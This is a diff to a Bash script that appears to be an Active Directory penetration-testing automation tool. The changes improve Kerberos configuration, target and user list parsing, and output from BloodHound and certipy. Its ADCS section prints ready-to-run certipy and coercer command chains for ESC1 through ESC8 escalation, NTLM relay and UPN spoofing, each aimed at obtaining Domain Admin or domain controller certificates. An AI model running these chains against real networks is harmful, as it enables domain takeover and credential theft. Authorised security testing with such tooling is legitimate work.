@@ -434,7 +434,7 @@ etc_resolv_update() {
 
 etc_krb5conf_update() {
     echo -e ""
-    if ! grep -q "${dc_domain}" "/etc/krb5.conf" >/dev/null 2>&1; then
+    if ! grep -q "${domain}" "/etc/krb5.conf" >/dev/null 2>&1; then
         krb5_bak="${Config_dir}/krb5.conf.$(date +%Y%m%d%H%M%S)".backup
         sudo cp /etc/krb5.conf "${krb5_bak}"
         echo -e "${YELLOW}[i] Backup file of /etc/krb5.conf created: ${krb5_bak}${NC}"
@@ -458,10 +458,25 @@ etc_krb5conf_update() {
         echo -e "                admin_server = ${dc_FQDN}" | sudo tee -a /etc/krb5.conf
         echo -e "                default_domain = ${domain,,}" | sudo tee -a /etc/krb5.conf
         echo -e "        }" | sudo tee -a /etc/krb5.conf
+        
+        if [ "${domain^^}" != "${dc_domain^^}" ]; then
+            echo -e "        ${dc_domain^^} = {" | sudo tee -a /etc/krb5.conf
+            echo -e "                kdc = ${dc_FQDN}" | sudo tee -a /etc/krb5.conf
+            echo -e "                admin_server = ${dc_FQDN}" | sudo tee -a /etc/krb5.conf
+            echo -e "                default_domain = ${dc_domain,,}" | sudo tee -a /etc/krb5.conf
+            echo -e "        }" | sudo tee -a /etc/krb5.conf
+        fi
+
         echo -e "" | sudo tee -a /etc/krb5.conf
         echo -e "[domain_realm]" | sudo tee -a /etc/krb5.conf
         echo -e "        .${domain,,} = ${domain^^}" | sudo tee -a /etc/krb5.conf
         echo -e "        ${domain,,} = ${domain^^}" | sudo tee -a /etc/krb5.conf
+
+        if [ "${domain^^}" != "${dc_domain^^}" ]; then
+            echo -e "        .${dc_domain,,} = ${dc_domain^^}" | sudo tee -a /etc/krb5.conf
+            echo -e "        ${dc_domain,,} = ${dc_domain^^}" | sudo tee -a /etc/krb5.conf
+        fi
+
         echo -e "${GREEN}[+] KRB5 config update complete${NC}"
     else
         echo -e "${PURPLE}[-] Domain already present in /etc/krb5.conf... ${NC}"
@@ -623,10 +638,7 @@ prepare() {
         etc_krb5conf_update
     fi
 
-    if ! stat "${servers_ip_list}" >/dev/null 2>&1; then /bin/touch "${servers_ip_list}"; fi
-    if ! stat "${servers_hostname_list}" >/dev/null 2>&1; then /bin/touch "${servers_hostname_list}"; fi
-    if ! stat "${dc_ip_list}" >/dev/null 2>&1; then /bin/touch "${dc_ip_list}"; fi
-    if ! stat "${dc_hostname_list}" >/dev/null 2>&1; then /bin/touch "${dc_hostname_list}"; fi
+    /bin/touch "${servers_ip_list}" "${servers_hostname_list}" "${dc_ip_list}" "${dc_hostname_list}" "${sql_ip_list}" "${sql_hostname_list}" 2>/dev/null
 
     if ! stat "${user_wordlist}" >/dev/null 2>&1; then
         echo -e "${RED}[-] Users list file not found${NC}"
@@ -640,37 +652,57 @@ prepare() {
 
     if [[ "${targets,,}" == "dc" ]]; then
         curr_targets="Domain Controllers"
+        curr_targets_sql="SQL servers"
         curr_targets_list="${target_dc}"
+        curr_targets_list_sql="${target_sql}"
     elif [[ "${targets,,}" == "all" ]]; then
         curr_targets="All domain servers"
+        curr_targets_sql="${curr_targets}"
         curr_targets_list="${target_servers}"
+        curr_targets_list_sql="${target_sql}"
     elif [[ ${targets,,} == "file="* ]]; then
         curr_targets="File containing list of servers: "
+        curr_targets_sql="${curr_targets}"
         custom_servers=$(echo "$targets" | cut -d "=" -f 2)
+        custom_servers_sql=$(echo "$targets" | cut -d "=" -f 2)
         /bin/cp "${custom_servers}" "${custom_servers_list}" 2>/dev/null
         if [ ! -s "${custom_servers_list}" ]; then
             echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
             curr_targets="Domain Controllers"
             curr_targets_list="${target_dc}"
+            curr_targets_sql="SQL servers"  
+            curr_targets_list_sql="${target_sql}"
             custom_servers=""
+            custom_servers_sql=""
+        else
+            curr_targets_list="${custom_servers_list}"
+            curr_targets_list_sql="${custom_servers_list}"
         fi
-        curr_targets_list="${custom_servers_list}"
     elif [[ ${targets,,} == "ip="* ]]; then
         curr_targets="IP or hostname: "
+        curr_targets_sql="${curr_targets}"
         custom_ip=$(echo "$targets" | cut -d "=" -f 2)
-        echo -n "$custom_ip" >"${custom_servers_list}" 2>/dev/null
+        custom_ip_sql=$(echo "$targets" | cut -d "=" -f 2)
+        echo "$custom_ip" >"${custom_servers_list}" 2>/dev/null
         if [ ! -s "${custom_servers_list}" ]; then
             echo -e "${RED}Invalid servers list.${NC} Choosing Domain Controllers as targets instead."
             curr_targets="Domain Controllers"
             curr_targets_list="${target_dc}"
+            curr_targets_sql="SQL servers"  
+            curr_targets_list_sql="${target_sql}"
             custom_ip=""
+            custom_ip_sql=""
+        else
+            curr_targets_list="${custom_servers_list}"
+            curr_targets_list_sql="${custom_servers_list}"
         fi
-        curr_targets_list="${custom_servers_list}"
     else
         echo -e "${RED}[-] Error invalid targets parameter.${NC} Choosing default setting: ${YELLOW}Domain Controllers${NC}"
         echo -e ""
         curr_targets="Domain Controllers"
         curr_targets_list="${target_dc}"
+        curr_targets_sql="SQL servers"
+        curr_targets_list_sql="${target_sql}"
     fi
 }
 
@@ -1052,21 +1084,24 @@ authenticate() {
 }
 
 parse_servers() {
-    sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${Servers_dir}"/servers_list_*_*".txt" 2>/dev/null | sort -uf >"${servers_hostname_list}" 2>&1
-    sed -e 's/ //' -e 's/\$//' -e 's/.*/\U&/' "${Servers_dir}"/dc_list_*_*".txt" 2>/dev/null  | sort -uf >"${dc_hostname_list}" 2>&1
-    sort -uf <(sort -uf "${Servers_dir}"/servers_ip_list_*_*".txt" 2>/dev/null) >"${servers_ip_list}"
-    sort -uf <(sort -uf "${Servers_dir}"/dc_ip_list_*_*".txt" 2>/dev/null) >"${dc_ip_list}"
+    cat "${Servers_dir}"/servers_list_*_*".txt" 2>/dev/null | tr -d '\r' | sed -e 's/ //g' -e 's/\$//' -e 's/.*/\U&/' | awk 'NF' | sort -uf > "${servers_hostname_list}"
+    cat "${Servers_dir}"/dc_list_*_*".txt" 2>/dev/null | tr -d '\r' | sed -e 's/ //g' -e 's/\$//' -e 's/.*/\U&/' | awk 'NF' | sort -uf > "${dc_hostname_list}"
+    cat "${Servers_dir}"/servers_ip_list_*_*".txt" 2>/dev/null | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | awk 'NF' | sort -uf > "${servers_ip_list}"
+    cat "${Servers_dir}"/dc_ip_list_*_*".txt" 2>/dev/null | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | awk 'NF' | sort -uf > "${dc_ip_list}"
 
     if ! grep -q "${dc_ip}" "${servers_ip_list}" 2>/dev/null; then echo "${dc_ip}" >>"${servers_ip_list}"; fi
     if ! grep -q "${dc_ip}" "${dc_ip_list}" 2>/dev/null; then echo "${dc_ip}" >>"${dc_ip_list}"; fi
-    if ! grep -q "${dc_FQDN^^}" "${dc_hostname_list}" 2>/dev/null; then echo "${dc_FQDN,,}" >>"${dc_hostname_list}"; fi
-    if ! grep -q "${dc_FQDN^^}" "${servers_hostname_list}" 2>/dev/null; then echo "${dc_FQDN,,}" >>"${servers_hostname_list}"; fi
+    if ! grep -qi "${dc_FQDN^^}" "${dc_hostname_list}" 2>/dev/null; then echo "${dc_FQDN^^}" >>"${dc_hostname_list}"; fi
+    if ! grep -qi "${dc_FQDN^^}" "${servers_hostname_list}" 2>/dev/null; then echo "${dc_FQDN^^}" >>"${servers_hostname_list}"; fi
 }
 
 parse_users() {
-    sort -uf <(sort -uf "${Users_dir}"/users_list_*_*".txt" 2>/dev/null) >"${users_list}"
+    cat "${Users_dir}"/users_list_*_*".txt" 2>/dev/null | tr -d '\r' | sed 's/^[[:space:]]*//;s/[[:space:]]*$//' | awk 'NF' | sort -uf > "${users_list}"
 
-    if [[ ! "${user}" == "" ]] && ! grep -q "${user}" "${users_list}" 2>/dev/null; then echo "${user}" >>"${users_list}"; fi
+    if [[ -n "${user}" ]] && ! grep -qi "^${user}$" "${users_list}" 2>/dev/null; then 
+        echo "${user}" >>"${users_list}"
+        sort -uf "${users_list}" -o "${users_list}"
+    fi    
 }
 
 dns_enum() {
@@ -1081,9 +1116,9 @@ dns_enum() {
         fi
         if [ -n "$nxc_dns_log" ] && [ -s "$nxc_dns_log" ]; then
             cp "$nxc_dns_log" "${dns_records}" 2>/dev/null
-            awk -F "\t " '{print $2}' "${dns_records}" | sed -n 's/\([0-9]\{1,3\}\(\.[0-9]\{1,3\}\)\{3\}\).*/\1/p' | sort -uf > "${Servers_dir}/servers_ip_list_dns_${dc_domain}.txt"
-            awk -F "\t " '{print $2}' "${dns_records}" | sed '/\([0-9]\{1,3\}\(\.[0-9]\{1,3\}\)\{3\}\)/d' | sed 's/.$//' | sort -uf > "${Servers_dir}/servers_list_dns_${dc_domain}.txt"
-            grep -i "msdcs" "${dns_records}" | awk -F'\t ' '{print $2}' | sed 's/.$//' |  sort -uf > "${Servers_dir}/servers_list_dns_${dc_domain}.txt"
+            awk -F "\t " '{print $2}' "${dns_records}" | grep -oE '([0-9]{1,3}\.){3}[0-9]{1,3}' | sort -uf > "${Servers_dir}/servers_ip_list_dns_${dc_domain}.txt"
+            awk -F "\t " '{print $2}' "${dns_records}" | grep -vE '^[0-9]{1,3}(\.[0-9]{1,3}){3}$' | sed 's/\.$//' | sort -uf > "${Servers_dir}/servers_list_dns_${dc_domain}.txt"
+            grep -i "msdcs" "${dns_records}" | awk -F'\t ' '{print $2}' | sed 's/\.$//' | sort -uf > "${Servers_dir}/dc_list_dns_${dc_domain}.txt"
         fi
         parse_servers
     else
@@ -1185,8 +1220,8 @@ bhd_enum() {
             run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN} ${ldaps_param}" | tee "${DomainRecon_dir}/BloodHound_${user_var}/bloodhound_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
             #run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${ne_kerb} ${target} ${argument_ne} --bloodhound --dns-server ${dns_ip} -c All --log ${DomainRecon_dir}/BloodHound_${user_var}/ne_bloodhound_output_${dc_domain}.txt" 2>&1
-            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhd_${user_var}.txt"
-            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhd_${user_var}.txt"
+            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_users.json 2>/dev/null | sort -uf > "${Users_dir}/users_list_bhd_${user_var}.txt"
+            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_computers.json 2>/dev/null | sort -uf > "${Servers_dir}/servers_list_bhd_${user_var}.txt"
             /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHound"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhd_${user_var}.txt"
             parse_users
             parse_servers
@@ -1220,8 +1255,8 @@ bhd_enum_dconly() {
             run_command "${bloodhound} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} -dc ${dc_FQDN} ${ldaps_param}" | tee "${DomainRecon_dir}/BloodHound_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
             cd "${current_dir}" || exit
             #run_command "${netexec} ${ne_verbose} ldap --port ${ldap_port} ${target} ${argument_ne} --bloodhound --dns-server ${dns_ip} -c DCOnly --log tee ${DomainRecon_dir}/BloodHound_${user_var}/ne_bloodhound_output_${dc_domain}.txt" 2>&1
-            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhd_${user_var}.txt"
-            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhd_${user_var}.txt"
+            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_users.json 2>/dev/null | sort -uf > "${Users_dir}/users_list_bhd_${user_var}.txt"
+            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHound_"${user_var}"/*_computers.json 2>/dev/null | sort -uf > "${Servers_dir}/servers_list_bhd_${user_var}.txt"
             /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHound"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhd_${user_var}.txt"
             parse_users
             parse_servers
@@ -1253,8 +1288,8 @@ bhdce_enum() {
             if [ "${ldapbind_bool}" == true ]; then ldapbind_param="--ldap-channel-binding"; else ldapbind_param=""; fi
             run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c all,LoggedOn -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} ${ldapbind_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
-            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhdce_${user_var}.txt"
-            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhdce_${user_var}.txt"
+            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_users.json 2>/dev/null | sort -uf > "${Users_dir}/users_list_bhdce_${user_var}.txt"
+            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE_"${user_var}"/*_computers.json 2>/dev/null | sort -uf > "${Servers_dir}/servers_list_bhdce_${user_var}.txt"
             /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhdce_${user_var}.txt"
             parse_users
             parse_servers
@@ -1286,8 +1321,8 @@ bhdce_enum_dconly() {
             if [ "${ldapbind_bool}" == true ]; then ldapbind_param="--ldap-channel-binding"; else ldapbind_param=""; fi
             run_command "${bloodhoundce} -d ${dc_domain} ${argument_bhd} -c DCOnly -ns ${dns_ip} --dns-timeout 10 ${dnstcp_param} ${ldapbind_param} -dc ${dc_FQDN}" | tee "${DomainRecon_dir}/BloodHoundCE_${user_var}/bloodhound_output_dconly_${dc_domain}.txt"
             cd "${current_dir}" || exit
-            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null > "${Users_dir}/users_list_bhdce_${user_out}_${dc_domain}.txt"
-            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_bhdce_${user_out}_${dc_domain}.txt"
+            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null | sort -uf > "${Users_dir}/users_list_bhdce_${user_out}_${dc_domain}.txt"
+            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_computers.json 2>/dev/null | sort -uf > "${Servers_dir}/servers_list_bhdce_${user_out}_${dc_domain}.txt"
             /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/BloodHoundCE"_${user_var}"/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_bhdce_${user_out}_${dc_domain}.txt"
             parse_users
             parse_servers
@@ -1885,8 +1920,8 @@ adcheck_enum() {
             if [ "${ldaps_bool}" == true ]; then ldaps_param="-s"; else ldaps_param=""; fi
             run_command "${ADCheck} ${argument_adcheck} ${ldaps_param} --dc-ip ${dc_ip}" | tee "${DomainRecon_dir}/ADCheck/ADCheck_output_${dc_domain}.txt"
             cd "${current_dir}" || exit
-            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/ADCheck/*_users.json 2>/dev/null > "${Users_dir}/users_list_adcheck_${dc_domain}.txt"
-            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/ADCheck/*_computers.json 2>/dev/null > "${Servers_dir}/servers_list_adcheck_${dc_domain}.txt"
+            /usr/bin/jq -r ".data[].Properties.samaccountname| select( . != null )" "${DomainRecon_dir}"/ADCheck/*_users.json 2>/dev/null | sort -uf > "${Users_dir}/users_list_adcheck_${dc_domain}.txt"
+            /usr/bin/jq -r ".data[].Properties.name| select( . != null )" "${DomainRecon_dir}"/ADCheck/*_computers.json 2>/dev/null | sort -uf > "${Servers_dir}/servers_list_adcheck_${dc_domain}.txt"
             /usr/bin/jq -r '.data[].Properties | select(.serviceprincipalnames | . != null) | select (.serviceprincipalnames[] | contains("MSSQL")).serviceprincipalnames[]' "${DomainRecon_dir}"/ADCheck/*_users.json 2>/dev/null | cut -d "/" -f 2 | cut -d ":" -f 1 | sort -u > "${Servers_dir}/sql_list_adcheck_${dc_domain}.txt"
             parse_users
             parse_servers
@@ -1992,6 +2027,8 @@ ne_adcs_enum() {
     fi
     pki_servers=$(grep -o "Found PKI Enrollment Server.*" "${ADCS_dir}/ne_adcs_output_${user_var}.txt" 2>/dev/null | cut -d " " -f 5- | awk '!x[$0]++')
     pki_cas=$(grep -o "Found CN.*" "${ADCS_dir}/ne_adcs_output_${user_var}.txt" 2>/dev/null | cut -d " " -f 3- | sed "s/ /SPACE/g" | awk '!x[$0]++')
+    pki_servers_display=$(echo "${pki_servers}" | tr '\n' ',' | sed 's/,$//')
+    pki_cas_display=$(echo "${pki_cas}" | sed 's/SPACE/ /g' | tr '\n' ',' | sed 's/,$//')
     echo -e ""
 }
 
@@ -2030,11 +2067,11 @@ certipy_enum() {
         else
             current_dir=$(pwd)
             cd "${ADCS_dir}" || exit
-            if [ "${ldaps_bool}" == true ]; then ldaps_param="" else ldaps_param="-ldap-scheme ldap"; fi
+            if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
             if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
             if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
             if [ "${dnstcp_bool}" == true ]; then dnstcp_param="-dns-tcp "; else dnstcp_param=""; fi
-            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -stdout"  | tee "${ADCS_dir}/certipy_output_${user_var}.txt"
+            run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -old-bloodhound -stdout"  | tee "${ADCS_dir}/certipy_output_${user_var}.txt"
             run_command "${certipy} find ${argument_certipy} -dc-ip ${dc_ip} -ns ${dns_ip} ${dnstcp_param} ${ldaps_param} ${ldapsign_param} ${ldapbind_param} -vulnerable -json -output vuln_${dc_domain} -stdout -hide-admins" 2>&1 | tee -a "${ADCS_dir}/certipy_vulnerable_output_${user_var}.txt"
             cd "${current_dir}" || exit
         fi
@@ -2045,7 +2082,7 @@ certipy_enum() {
 
 adcs_vuln_parse() {
     ne_adcs_enum
-        if [ "${ldaps_bool}" == true ]; then ldaps_param="" else ldaps_param="-ldap-scheme ldap"; fi
+        if [ "${ldaps_bool}" == true ]; then ldaps_param=""; else ldaps_param="-ldap-scheme ldap"; fi
         if [ "${ldapsign_bool}" == true ]; then ldapsign_param=""; else ldapsign_param="-no-ldap-signing"; fi
         if [ "${ldapbind_bool}" == true ]; then ldapbind_param=""; else ldapbind_param="-no-ldap-channel-binding"; fi
     esc1_vuln=$(/usr/bin/jq -r '."Certificate Templates"[] | select (."[!] Vulnerabilities"."ESC1" and (."[!] Vulnerabilities"[] | contains("Admins") | not) and ."Enabled" == true)."Template Name"' "${ADCS_dir}/vuln_${dc_domain}_Certipy.json" 2>/dev/null | sort -u)
@@ -2054,7 +2091,7 @@ adcs_vuln_parse() {
         for vulntemp in $esc1_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dc_NETBIOS} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dc_NETBIOS} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Authenticate using pfx of Domain Admin or DC:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin_Domain Controller ].pfx -dc-ip ${dc_ip}"
         done
@@ -2066,9 +2103,9 @@ adcs_vuln_parse() {
         for vulntemp in $esc2_3_vuln; do
             echo -e "\n${BLUE}# ${vulntemp} certificate template${NC}"
             echo -e "${CYAN}1. Request a certificate based on the vulnerable template:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template ${vulntemp} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Use the Certificate Request Agent certificate to request a certificate on behalf of the Domain Admin:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template [ User ] -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template [ User ] -on-behalf-of $(echo "$dc_domain" | cut -d "." -f 1)\\[ Domain Admin ] -pfx '${user}.pfx' -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Authenticate using pfx of Domain Admin:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2082,7 +2119,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}1. Make the template vulnerable to ESC1:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -save-old -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas//SPACE/ }\" ] -target [ ${pki_servers} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dns_ip} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca [ \"${pki_cas_display}\" ] -target [ ${pki_servers_display} ] -template ${vulntemp} -upn [ Domain Admin ]@${dc_domain} -dns ${dns_ip} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Restore configuration of vulnerable template:${NC}"
             echo -e "${certipy} template ${argument_certipy} -template ${vulntemp} -configuration ${vulntemp}.json ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}4. Authenticate using pfx of Domain Admin or DC:${NC}"
@@ -2096,7 +2133,7 @@ adcs_vuln_parse() {
         for vulnca in $esc6_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Request certificate with an arbitrary UPN (Domain Admin or DC or both):${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -template [ User ] -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers_display} ] -template [ User ] -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}2. Authenticate using pfx of Domain Admin:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2112,11 +2149,11 @@ adcs_vuln_parse() {
             echo -e "${CYAN}2. Enable SubCA certificate template:${NC}"
             echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -enable-template SubCA -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Save the private key and note down the request ID:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -template SubCA -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers_display} ] -template SubCA -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}4. Issue a failed request (need ManageCA and ManageCertificates rights for a failed request):${NC}"
             echo -e "${certipy} ca ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -issue-request <request_ID> -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}5. Retrieve an issued certificate:${NC}"
-            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers} ] -retrieve <request_ID> -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
+            echo -e "${certipy} req ${argument_certipy} -ca \"${vulnca//SPACE/ }\" -target [ ${pki_servers_display} ] -retrieve <request_ID> -dc-ip ${dc_ip} -key-size 4096 ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}6. Authenticate using pfx of Domain Admin:${NC}"
             echo -e "${certipy} auth -pfx [ Domain Admin ].pfx -dc-ip ${dc_ip} ${ldaps_param}"
         done
@@ -2128,7 +2165,7 @@ adcs_vuln_parse() {
         for vulnca in $esc8_vuln; do
             echo -e "\n${BLUE}# \"${vulnca//SPACE/ }\" certificate authority${NC}"
             echo -e "${CYAN}1. Start the relay server:${NC}"
-            echo -e "${certipy} relay -target http://[ ${pki_servers} ] -ca \"${vulnca//SPACE/ }\" -template [ DomainController ]"
+            echo -e "${certipy} relay -target http://[ ${pki_servers_display} ] -ca \"${vulnca//SPACE/ }\" -template [ DomainController ]"
             echo -e "${CYAN}2. Coerce Domain Controller:${NC}"
             echo -e "${coercer} coerce ${argument_coercer} -t ${dc_ip} -l [ ${attacker_IP} ] --dc-ip ${dc_ip}"
             echo -e "${CYAN}3. Authenticate using pfx of Domain Controller:${NC}"
@@ -2146,7 +2183,7 @@ adcs_vuln_parse() {
             echo -e "${CYAN}2. Change userPrincipalName of second_user to Domain Admin (UPN spoofing):${NC}"
             echo -e "${certipy} account update ${argument_certipy} -user <second_user> -upn [ Domain Admin ]@${dc_domain} -dc-ip ${dc_ip} ${ldaps_param} ${ldapsign_param} ${ldapbind_param}"
             echo -e "${CYAN}3. Request vulnerable certificate as second_user:${NC}"
